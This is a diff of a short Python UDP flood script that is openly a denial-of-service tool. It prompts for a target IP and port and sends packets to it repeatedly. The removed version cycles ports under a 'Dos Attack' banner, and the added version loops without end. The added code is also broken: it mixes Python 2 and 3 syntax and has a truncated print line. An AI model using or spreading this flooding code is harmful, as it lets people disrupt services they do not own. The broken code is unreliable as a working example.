@@ -1,19 +1,24 @@
-import os,sys,time
+import os
+import sys
 import socket
 import random
-soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-def Dos():
-    os.system("figlet Dos Attack")
-    host=input("[#] Enter Targer IP : ")	
-    port=int(input("[#] Port : "))
-    num=int(input("[#] How many times : "))
-    print(30*"=")
-    count=0
-    for i in range(1,num+1):
-                soc.sendto(bytes, (host,port))
-                count+=1
-                port+=1 
-                print(f"\033[32m[~] Sent {count} packet to {host}  throught port {port} \033[0m ")
-                if port == 65543:
-                	port=1	              	      
+
+sock = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random.randint(0,1024)
+
+os.system ("clear")
+os.system("ls")
+os.system("clear")
+print ("")
+ip = raw_input ("\033[36;1m" "Target IP>>  ")
+port = input ("\033[36;1m" "Port>> ")
+sent = 0
+
+
+while True:
+        try:
+                sock.sendto(str(bytes),( str(ip), port))
+                sent = sent +1
+                print "sent %d packets to %s through port %d."       >
+        except KeyboardInterrupt:
+                sys.exit()
